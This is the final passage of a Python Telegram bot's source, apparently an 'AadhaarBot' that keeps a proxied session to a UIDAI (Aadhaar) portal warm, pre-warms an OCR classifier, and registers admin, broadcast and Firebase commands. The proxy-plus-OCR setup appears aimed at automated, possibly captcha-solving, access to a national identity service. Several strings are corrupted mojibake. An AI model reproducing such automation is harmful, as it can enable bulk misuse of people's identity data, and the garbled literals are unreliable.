                    f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ¢Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ({page+1}/{total_pages})</b>\n\n"
                    "<blockquote><b>Delete karne ke liye button press karo:</b></blockquote>"
                )
                try:
                    await query.message.edit_text(text, reply_markup=kb, parse_mode='HTML')
                except Exception:
                    try:
                        await query.message.edit_reply_markup(kb)
                    except Exception:
                        pass


# ==========================================
# MAIN
# ==========================================
def main():
    setup_admins()

    async def _keep_uidai_warm():
        while True:
            try:
                s = get_proxy_session()
                await s.get(f"{UIDAI_BASE}/", timeout=4)
            except Exception:
                pass
            await asyncio.sleep(25)

    import gc
    gc.set_threshold(50000, 10, 10)

    async def _warmup_ocr():
        try:
            dummy = _pil_to_png(Image.new('RGB', (80, 30), color=(255,255,255)))
            _ocr_classify(dummy)
            if _ocr_beta:
                _ocr_classify_beta(dummy)
            logger.info("Ã¢ÂÂ¡ OCR engine pre-warmed for 0ms cold-start")
        except Exception:
            pass

    async def _on_startup(app: Application):
        loop = asyncio.get_running_loop()
        executor = ThreadPoolExecutor(max_workers=100, thread_name_prefix="BotPool")
        loop.set_default_executor(executor)
        logger.info("Ã¢ÂÂ¡ Custom ThreadPoolExecutor initialized with 100 workers for non-blocking multi-user concurrency")
        asyncio.create_task(_keep_uidai_warm())
        asyncio.create_task(_warmup_ocr())

    req = None
    try:
        from telegram.request import HTTPXRequest as _HTTPXRequest
        import inspect as _inspect
        _params = _inspect.signature(_HTTPXRequest.__init__).parameters
        _kwargs = {"connection_pool_size": 128, "connect_timeout": 5.0,
                   "pool_timeout": 10.0, "read_timeout": 15.0, "write_timeout": 15.0}
        if "http_version" in _params:
            _kwargs["http_version"] = "2"
        req = _HTTPXRequest(**_kwargs)
    except Exception as _e:
        logger.warning(f"HTTPXRequest init failed, using default: {_e}")
        req = None

    bot = AadhaarBot()
    builder = Application.builder().token(TOKEN)
    if req is not None:
        builder = builder.request(req)
    application = (
        builder
        .concurrent_updates(True)
        .post_init(_on_startup)
        .build()
    )


    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("help", bot.help))
    application.add_handler(CommandHandler("cancel", bot.cancel))
    application.add_handler(CommandHandler("ban", bot.admin_ban_user))
    application.add_handler(CommandHandler("unban", bot.admin_unban_user))
    application.add_handler(CommandHandler("stats", bot.admin_stats))
    application.add_handler(CommandHandler("userinfo", bot.admin_user_info))
    application.add_handler(CommandHandler("broadcast", bot.admin_broadcast))
    application.add_handler(CommandHandler("pin_broadcast", bot.admin_pin_broadcast))
    application.add_handler(CommandHandler("maintenance", bot.admin_maintenance))
    application.add_handler(CommandHandler("admin", bot.show_admin_panel))
    application.add_handler(CommandHandler("firebases", bot.admin_firebases_cmd))
    application.add_handler(CommandHandler("allfirebases", bot.admin_firebases_cmd))
    application.add_handler(CommandHandler("addfirebase", bot.cmd_add_firebase))
    application.add_handler(CommandHandler("add_firebase", bot.cmd_add_firebase))
    application.add_handler(CallbackQueryHandler(bot.button_callback, block=False))
    application.add_handler(ChatMemberHandler(bot.handle_chat_member_update, ChatMemberHandler.CHAT_MEMBER, block=False))
    application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, bot.handle_message, block=False))

    async def _error_handler(update, context):
        """Log Telegram failures with enough context to identify the operation."""
        err = context.error
        update_id = getattr(update, "update_id", None) if update else None
        user = getattr(getattr(update, "effective_user", None), "id", None) if update else None
        chat = getattr(getattr(update, "effective_chat", None), "id", None) if update else None
        prefix = f"update_id={update_id} user_id={user} chat_id={chat}"
        if isinstance(err, tg_err.BadRequest):
            message = str(err)
            benign = ("message is not modified", "message to edit not found",
                      "query is too old", "message can't be deleted")
            if any(item in message.lower() for item in benign):
                logger.info("Telegram benign BadRequest (%s): %s", prefix, message)
            else:
                logger.error("Telegram BadRequest (%s): %s", prefix, message, exc_info=err)
            return
        if isinstance(err, tg_err.RetryAfter):
            logger.warning("Telegram rate limit (%s): retry_after=%s", prefix, err.retry_after)
            return
        if isinstance(err, (tg_err.NetworkError, tg_err.TimedOut)):
            logger.warning("Telegram network/timeout error (%s): %s", prefix, err, exc_info=err)
            return
        logger.error("Unhandled bot error (%s): %s", prefix, err, exc_info=err)

    application.add_error_handler(_error_handler)

    logger.info("Bot starting; polling for Telegram updates")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try:
        import uvloop
        uvloop.install()
        logger.info("Ã¢ÂÂ¡ Ultra-fast uvloop event loop active")
    except Exception as e:
        logger.warning(f"uvloop not loaded: {e}")
    try:
        main()
    except KeyboardInterrupt:
        print("\nÃ¢ÂÂ Stopped")
        sys.exit()
